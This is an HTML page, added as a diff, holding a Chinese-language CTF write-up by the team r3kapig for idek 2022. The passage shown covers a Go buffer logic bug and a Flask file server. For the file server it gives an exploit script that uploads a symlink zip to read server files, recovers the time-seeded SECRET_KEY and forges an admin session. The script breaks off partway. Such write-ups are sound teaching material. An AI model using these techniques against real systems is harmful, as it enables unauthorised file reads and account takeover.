@@ -1,0 +1,1301 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/logo.png">
+    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/img/logo.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/logo.png">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+    <title>idek 2022* Web &amp;&amp; Crypto Writeup | r3kapig</title>
+    <meta property="og:title" content="r3kapig writeup" />
+    <meta property="og:locale" content="en_US" />
+    <meta name="description" content="Writeup for idek 2022* Web &amp;&amp; Crypto Writeup" />
+    <meta property="og:description" content="Writeup for idek 2022* Web &amp;&amp; Crypto Writeup" />
+    <link rel="canonical" href="https://r3kapig.com/writeup/" />
+    <meta property="og:url" content="https://r3kapig.com/writeup/" />
+    <meta property="og:site_name" content="r3kapig" />
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      min-height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      min-height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="../">
+        <img src="https://r3kapig.com/assets/img/logo.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">r3kapig / writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                前言
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#readme">readme</a>
+    
+                <a class="dropdown-item" href="#simplefileserver">simplefileserver</a>
+    
+                <a class="dropdown-item" href="#json-beautifier">json-beautifier</a>
+    
+                <a class="dropdown-item" href="#paywall">paywall</a>
+    
+                <a class="dropdown-item" href="#task-manager">task-manager</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#cleithrophobia">cleithrophobia</a>
+    
+                <a class="dropdown-item" href="#ecrsa">ecrsa</a>
+    
+                <a class="dropdown-item" href="#chronophobia：">chronophobia：</a>
+    
+                <a class="dropdown-item" href="#megalophobia">megalophobia</a>
+    
+                <a class="dropdown-item" href="#primonumerophobia">primonumerophobia</a>
+    
+                <a class="dropdown-item" href="#psychophobia">psychophobia</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                结语
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="order-3 dual-collapse2"> <!-- navbar-collapse w100 collapse -->
+        <ul class="navbar-nav ml-auto" style="flex-direction: row;">
+          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">前言</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#readme" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">readme</span>
+            </a>
+    
+<a href="#simplefileserver" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">simplefileserver</span>
+            </a>
+    
+<a href="#json-beautifier" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">json-beautifier</span>
+            </a>
+    
+<a href="#paywall" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">paywall</span>
+            </a>
+    
+<a href="#task-manager" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">task-manager</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#cleithrophobia" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">cleithrophobia</span>
+            </a>
+    
+<a href="#ecrsa" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">ecrsa</span>
+            </a>
+    
+<a href="#chronophobia：" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">chronophobia：</span>
+            </a>
+    
+<a href="#megalophobia" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">megalophobia</span>
+            </a>
+    
+<a href="#primonumerophobia" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">primonumerophobia</span>
+            </a>
+    
+<a href="#psychophobia" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">psychophobia</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">结语</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="idek-2022-web--crypto-writeup"><a class="header-link" href="#idek-2022-web--crypto-writeup"></a>idek 2022* Web &amp;&amp; Crypto Writeup</h1>
+<h2 id="前言"><a class="header-link" href="#前言"></a>前言</h2>
+<p>根据前面我们所整理的wp,这里最后将web&amp;&amp;Crypto的writeup整理完毕在此呈现,希望大家共同学习进步.本比赛的部分Web和Crypto比较困难而且有趣.之后我们会推出一些复现文章,敬请期待.</p>
+<p class="img-container"><img src="https://imgur.com/x2Krcsf.png" alt=""></p>
+<p>也欢迎对国际比赛感兴趣的师傅,欢迎简历<code>root@r3kapig.com</code>.我们会及时回复</p>
+<h2 id="web"><a class="header-link" href="#web"></a>Web:</h2>
+<h3 id="readme"><a class="header-link" href="#readme"></a>Readme:</h3>
+<p>很简单签到题，算是个逻辑漏洞问题</p>
+<p>这个程序中只有一个路由</p>
+<pre class="hljs"><code>http.HandleFunc(<span class="hljs-string">&quot;/just-read-it&quot;</span>, justReadIt)</code></pre><p>首先简单看一下可以得出程序逻辑如果能成功走到justReadIt函数最下方就能获得flag</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">justReadIt</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> {
+        <span class="hljs-keyword">defer</span> r.Body.Close()
+
+        body, err := ioutil.ReadAll(r.Body)
+        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
+                w.WriteHeader(<span class="hljs-number">500</span>)
+                w.Write([]<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;bad request\n&quot;</span>))
+                <span class="hljs-keyword">return</span>
+        }
+
+        reqData := ReadOrderReq{}
+        <span class="hljs-keyword">if</span> err := json.Unmarshal(body, &amp;reqData); err != <span class="hljs-literal">nil</span> {
+                w.WriteHeader(<span class="hljs-number">500</span>)
+                w.Write([]<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;invalid body\n&quot;</span>))
+                <span class="hljs-keyword">return</span>
+        }
+
+        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(reqData.Orders) &gt; MaxOrders {
+                w.WriteHeader(<span class="hljs-number">500</span>)
+                w.Write([]<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;whoa there, max 10 orders!\n&quot;</span>))
+                <span class="hljs-keyword">return</span>
+        }
+
+        reader := bytes.NewReader(randomData)
+        validator := NewValidator()
+
+        ctx := context.Background()
+        <span class="hljs-keyword">for</span> _, o := <span class="hljs-keyword">range</span> reqData.Orders {
+                <span class="hljs-keyword">if</span> err := validator.CheckReadOrder(o); err != <span class="hljs-literal">nil</span> {
+                        w.WriteHeader(<span class="hljs-number">500</span>)
+                        w.Write([]<span class="hljs-keyword">byte</span>(fmt.Sprintf(<span class="hljs-string">&quot;error: %v\n&quot;</span>, err)))
+                        <span class="hljs-keyword">return</span>
+                }
+
+                ctx = WithValidatorCtx(ctx, reader, <span class="hljs-keyword">int</span>(o))
+                _, err := validator.Read(ctx)
+                <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
+                        w.WriteHeader(<span class="hljs-number">500</span>)
+                        w.Write([]<span class="hljs-keyword">byte</span>(fmt.Sprintf(<span class="hljs-string">&quot;failed to read: %v\n&quot;</span>, err)))
+                        <span class="hljs-keyword">return</span>
+                }
+        }
+
+        <span class="hljs-keyword">if</span> err := validator.Validate(ctx); err != <span class="hljs-literal">nil</span> {
+                w.WriteHeader(<span class="hljs-number">500</span>)
+                w.Write([]<span class="hljs-keyword">byte</span>(fmt.Sprintf(<span class="hljs-string">&quot;validation failed: %v\n&quot;</span>, err)))
+                <span class="hljs-keyword">return</span>
+        }
+
+        w.WriteHeader(<span class="hljs-number">200</span>)
+        w.Write([]<span class="hljs-keyword">byte</span>(os.Getenv(<span class="hljs-string">&quot;FLAG&quot;</span>)))
+}</code></pre><p>我们一点一点来看，首先是接受了一个传来的json数据，解析保存到reqData当中，从下面可以看出只接受一个完全由数字组成的int数组，字段名叫orders</p>
+<pre class="hljs"><code><span class="hljs-keyword">type</span> ReadOrderReq <span class="hljs-keyword">struct</span> {
+        Orders []<span class="hljs-keyword">int</span> <span class="hljs-string">`json:&quot;orders&quot;`</span>
+}</code></pre><p>之后会用randomData初始化一个reader</p>
+<pre class="hljs"><code>reader := bytes.<span class="hljs-built_in">NewReader</span>(randomData)</code></pre><p>而这个randomData则是由initRandomData函数初始化，记住这个password复制在了12625之后</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">initRandomData</span><span class="hljs-params">()</span></span> {
+        rand.Seed(<span class="hljs-number">1337</span>)
+        randomData = <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">byte</span>, <span class="hljs-number">24576</span>)
+        <span class="hljs-keyword">if</span> _, err := rand.Read(randomData); err != <span class="hljs-literal">nil</span> {
+                <span class="hljs-built_in">panic</span>(err)
+        }
+        <span class="hljs-built_in">copy</span>(randomData[<span class="hljs-number">12625</span>:], password[:])
+}</code></pre><p>初始化之后会遍历<code>reqData.Orders</code>
+调用<code>CheckReadOrder</code>检查oders中的int值范围是否在0-100</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(v *Validator)</span> <span class="hljs-title">CheckReadOrder</span><span class="hljs-params">(o <span class="hljs-keyword">int</span>)</span> <span class="hljs-title">error</span></span> {
+        <span class="hljs-keyword">if</span> o &lt;= <span class="hljs-number">0</span> || o &gt; <span class="hljs-number">100</span> {
+                <span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;invalid order %v&quot;</span>, o)
+        }
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
+}</code></pre><p>之后根据数值读出指定位数的值</p>
+<pre class="hljs"><code><span class="hljs-keyword">if</span> err := validator.Validate(ctx); err != <span class="hljs-literal">nil</span> {
+                w.WriteHeader(<span class="hljs-number">500</span>)
+                w.Write([]<span class="hljs-keyword">byte</span>(fmt.Sprintf(<span class="hljs-string">&quot;validation failed: %v\n&quot;</span>, err)))
+                <span class="hljs-keyword">return</span>
+        }
+
+        w.WriteHeader(<span class="hljs-number">200</span>)
+        w.Write([]<span class="hljs-keyword">byte</span>(os.Getenv(<span class="hljs-string">&quot;FLAG&quot;</span>)))</code></pre><p>这个函数功能就是读32位，之后与password比较，成功返回true，而我们前面说过这个password复制在了12625之后，并且oders数组容量最多只能有10个数字</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(v *Validator)</span> <span class="hljs-title">Validate</span><span class="hljs-params">(ctx context.Context)</span> <span class="hljs-title">error</span></span> {
+        r, _ := GetValidatorCtxData(ctx)
+        buf, err := v.Read(WithValidatorCtx(ctx, r, <span class="hljs-number">32</span>))
+        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
+                <span class="hljs-keyword">return</span> err
+        }
+        <span class="hljs-keyword">if</span> bytes.Compare(buf, password[:]) != <span class="hljs-number">0</span> {
+                <span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">&quot;invalid password&quot;</span>)
+        }
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
+}</code></pre><p>就算全取最大100，10个也才1000，距离我们的12625还差很远</p>
+<p>再往前看发现read之前</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(v *Validator)</span> <span class="hljs-title">Read</span><span class="hljs-params">(ctx context.Context)</span> <span class="hljs-params">([]<span class="hljs-keyword">byte</span>, error)</span></span> {
+        r, s := GetValidatorCtxData(ctx)
+        buf := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">byte</span>, s)
+        _, err := r.Read(buf)
+        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
+                <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;read error: %v&quot;</span>, err)
+        }
+        <span class="hljs-keyword">return</span> buf, <span class="hljs-literal">nil</span>
+}</code></pre><p>有这样一个调用，如果size大于等于100会调用一个bufio.NewReader</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetValidatorCtxData</span><span class="hljs-params">(ctx context.Context)</span> <span class="hljs-params">(io.Reader, <span class="hljs-keyword">int</span>)</span></span> {
+        reader := ctx.Value(reqValReaderKey).(io.Reader)
+        size := ctx.Value(reqValSizeKey).(<span class="hljs-keyword">int</span>)
+        <span class="hljs-keyword">if</span> size &gt;= <span class="hljs-number">100</span> {
+                reader = bufio.NewReader(reader)
+        }
+        <span class="hljs-keyword">return</span> reader, size
+}</code></pre><p>这个defaultBufSize是4096</p>
+<pre class="hljs"><code><span class="hljs-comment">// NewReader returns a new Reader whose buffer has the default size.</span>
+<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewReader</span><span class="hljs-params">(rd io.Reader)</span> *<span class="hljs-title">Reader</span></span> {
+        <span class="hljs-keyword">return</span> NewReaderSize(rd, defaultBufSize)
+}</code></pre><p>最终</p>
+<p class="img-container"><img src="https://imgur.com/UMCkOg9.png" alt=""></p>
+<h3 id="simplefileserver"><a class="header-link" href="#simplefileserver"></a>SimpleFileServer:</h3>
+<p>也是python的flask的题目</p>
+<p>可以看到获得flag的条件，那就是成为admin，所以很容易猜测到考点是session伪造，而flask里面这个session的生成通常和变量<code>app.config[&quot;SECRET_KEY&quot;]</code>息息相关</p>
+<pre class="hljs"><code><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/flag&quot;</span></span>)</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">flag</span>():</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&quot;admin&quot;</span>):
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Unauthorized!&quot;</span>
+    <span class="hljs-keyword">return</span> subprocess.run(<span class="hljs-string">&quot;./flag&quot;</span>, shell=<span class="hljs-literal">True</span>, stdout=subprocess.PIPE).stdout.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)</code></pre><p>因此一切的前提是我们能获得这个<code>SECRET_KEY</code></p>
+<pre class="hljs"><code>app.config[<span class="hljs-string">&quot;SECRET_KEY&quot;</span>] = os.environ[<span class="hljs-string">&quot;SECRET_KEY&quot;</span>]</code></pre><p>而这部分生成在config.py当中</p>
+<p>要爆破这部分很明显一是我们需要知道这个<code>time.time()</code>的值，另一个还需要知道<code>SECRET_OFFSET</code>的偏移</p>
+<p>除开注册与登录路由，upoad支持上传一个zip文件并解压到指定目录</p>
+<pre class="hljs"><code><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/upload&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span>():</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&quot;uid&quot;</span>):
+        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)
+    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;GET&quot;</span>:
+        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;upload.html&quot;</span>)
+
+    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;file&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:
+        flash(<span class="hljs-string">&quot;You didn&#x27;t upload a file!&quot;</span>, <span class="hljs-string">&quot;danger&quot;</span>)
+        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;upload.html&quot;</span>)
+    
+    file = request.files[<span class="hljs-string">&quot;file&quot;</span>]
+    uuidpath = <span class="hljs-built_in">str</span>(uuid.uuid4())
+    filename = <span class="hljs-string">f&quot;<span class="hljs-subst">{DATA_DIR}</span>uploadraw/<span class="hljs-subst">{uuidpath}</span>.zip&quot;</span>
+    file.save(filename)
+    subprocess.call([<span class="hljs-string">&quot;unzip&quot;</span>, filename, <span class="hljs-string">&quot;-d&quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">{DATA_DIR}</span>uploads/<span class="hljs-subst">{uuidpath}</span>&quot;</span>])    
+    flash(<span class="hljs-string">f&#x27;Your unique ID is &lt;a href=&quot;/uploads/<span class="hljs-subst">{uuidpath}</span>&quot;&gt;<span class="hljs-subst">{uuidpath}</span>&lt;/a&gt;!&#x27;</span>, <span class="hljs-string">&quot;success&quot;</span>)
+    logger.info(<span class="hljs-string">f&quot;User <span class="hljs-subst">{session.get(<span class="hljs-string">&#x27;uid&#x27;</span>)}</span> uploaded file <span class="hljs-subst">{uuidpath}</span>&quot;</span>)
+    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/upload&quot;</span>)</code></pre><p>uploads/xxx路由支持我们之间读取上传解压后的文件内容</p>
+<pre class="hljs"><code><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/uploads/&lt;path:path&gt;&quot;</span></span>)</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">uploads</span>(<span class="hljs-params">path</span>):</span>
+    <span class="hljs-keyword">try</span>:
+        <span class="hljs-keyword">return</span> send_from_directory(DATA_DIR + <span class="hljs-string">&quot;uploads&quot;</span>, path)
+    <span class="hljs-keyword">except</span> PermissionError:
+        abort(<span class="hljs-number">404</span>)</code></pre><p>这个读文件部分按理说只能读取uploads下的文件，看看底层实现用的是safe_join不支持跨目录读取</p>
+<p class="img-container"><img src="https://imgur.com/4voOjHo.png" alt=""></p>
+<p>可以看到在这里获取路径path后，最终调用open打开文件并返回内容</p>
+<p class="img-container"><img src="https://imgur.com/3OWl2eR.png" alt=""></p>
+<p>解决方法是可以配合symlink软连接实现任意文件读，这样我们一方面可以读config.py获取<code>SECRET_OFFSET</code></p>
+<p>另一方面为了得到时间</p>
+<p>可以看到题目很良心的在<code>server.log</code>当中输出了time</p>
+<pre class="hljs"><code><span class="hljs-comment"># Configure logging</span>
+LOG_HANDLER = logging.FileHandler(DATA_DIR + <span class="hljs-string">&#x27;server.log&#x27;</span>)
+LOG_HANDLER.setFormatter(logging.Formatter(fmt=<span class="hljs-string">&quot;[{levelname}] [{asctime}] {message}&quot;</span>, style=<span class="hljs-string">&#x27;{&#x27;</span>))
+logger = logging.getLogger(<span class="hljs-string">&quot;application&quot;</span>)
+logger.addHandler(LOG_HANDLER)
+logger.propagate = <span class="hljs-literal">False</span>
+<span class="hljs-keyword">for</span> handler <span class="hljs-keyword">in</span> logging.root.handlers[:]:
+    logging.root.removeHandler(handler)
+logging.basicConfig(level=logging.WARNING, <span class="hljs-built_in">format</span>=<span class="hljs-string">&#x27;%(asctime)s %(levelname)s %(name)s %(threadName)s : %(message)s&#x27;</span>)
+logging.getLogger().addHandler(logging.StreamHandler())</code></pre><p>不过这个时间不是精确的，通过转换为时间戳我们只能精确到整数部分，不过好在这里随机数的seed是配合round做了取整因此我们就能很容易实现爆破了</p>
+<p class="img-container"><img src="https://imgur.com/v0iCOF4.png" alt=""></p>
+<p>我们可以很方便配合这个信息得到time.time()的值
+本地ln做一个symlink的文件</p>
+<p class="img-container"><img src="https://imgur.com/9iIFU0F.png" alt=""></p>
+<p>之后爆破到<code>SECRET_KEY</code>后，修改admin为true再生成session即可</p>
+<pre class="hljs"><code>decoded = {<span class="hljs-string">&#x27;admin&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;uid&#x27;</span>: userinfo[<span class="hljs-string">&#x27;username&#x27;</span>]}</code></pre><p>最终exp，配合flask_unsign(<a href="https://github.com/Paradoxis/Flask-Unsign">https://github.com/Paradoxis/Flask-Unsign</a>)</p>
+<pre class="hljs"><code><span class="hljs-keyword">import</span> base64
+
+<span class="hljs-keyword">import</span> requests, re, time, datetime, random
+<span class="hljs-keyword">import</span> flask_unsign
+
+sess = requests.session()
+SECRET_OFFSET = -<span class="hljs-number">67198624</span> * <span class="hljs-number">1000</span>
+userinfo = {<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;yyds&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;yyds&quot;</span>}
+baseurl = <span class="hljs-string">&quot;http://127.0.0.1:1337/&quot;</span>
+pocZip = <span class="hljs-string">&quot;UEsDBAoAAAAAACJsMVZvT1MBDwAAAA8AAAAKABwAc2VydmVyLmxvZ1VUCQADDzPGYw8zxmN1eAsAAQT1AQAABBQAAAAvdG1wL3NlcnZlci5sb2dQSwMECgAAAAAAG2wxVuPo95IOAAAADgAAAAkAHABjb25maWcucHlVVAkAAwUzxmMFM8ZjdXgLAAEE9QEAAAQUAAAAL2FwcC9jb25maWcucHlQSwECHgMKAAAAAAAibDFWb09TAQ8AAAAPAAAACgAYAAAAAAAAAAAA7aEAAAAAc2VydmVyLmxvZ1VUBQADDzPGY3V4CwABBPUBAAAEFAAAAFBLAQIeAwoAAAAAABtsMVbj6PeSDgAAAA4AAAAJABgAAAAAAAAAAADtoVMAAABjb25maWcucHlVVAUAAwUzxmN1eAsAAQT1AQAABBQAAABQSwUGAAAAAAIAAgCfAAAApAAAAAAA&quot;</span>
+cookie = <span class="hljs-string">&quot;&quot;</span>
+log_url = <span class="hljs-string">&quot;&quot;</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register</span>():</span>
+    reg_url = baseurl + <span class="hljs-string">&quot;register&quot;</span>
+    sess.post(reg_url, userinfo)
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span>
+    <span class="hljs-keyword">global</span> cookie
+    set_cookie = sess.post(baseurl + <span class="hljs-string">&quot;login&quot;</span>, data=userinfo, allow_redirects=<span class="hljs-literal">False</span>).headers[<span class="hljs-string">&#x27;Set-Cookie&#x27;</span>]
+    cookie = set_cookie[<span class="hljs-number">8</span>:<span class="hljs-number">82</span>]
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span>():</span>
+    <span class="hljs-keyword">global</span> log_url
+    log_url = re.search(<span class="hljs-string">&#x27;&lt;a href=&quot;/uploads/.*&quot;&gt;&#x27;</span>, sess.post(
+        baseurl + <span class="hljs-string">&quot;upload&quot;</span>, headers={<span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">f&#x27;session=<span class="hljs-subst">{cookie}</span>&#x27;</span>},
+        files={<span class="hljs-string">&#x27;file&#x27;</span>: base64.b64decode(pocZip)}).text).group()[<span class="hljs-number">9</span>:-<span class="hljs-number">2</span>]
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>():</span>
+    server_log = baseurl + log_url + <span class="hljs-string">&quot;/server.log&quot;</span>
+    config = baseurl + log_url + <span class="hljs-string">&quot;/config.py&quot;</span>
+    SECRET_OFFSET = <span class="hljs-built_in">int</span>(re.findall(<span class="hljs-string">&quot;SECRET_OFFSET = (.*?) # REDACTED&quot;</span>, sess.get(config).text)[<span class="hljs-number">0</span>]) * <span class="hljs-number">1000</span>
+    log = sess.get(server_log).text
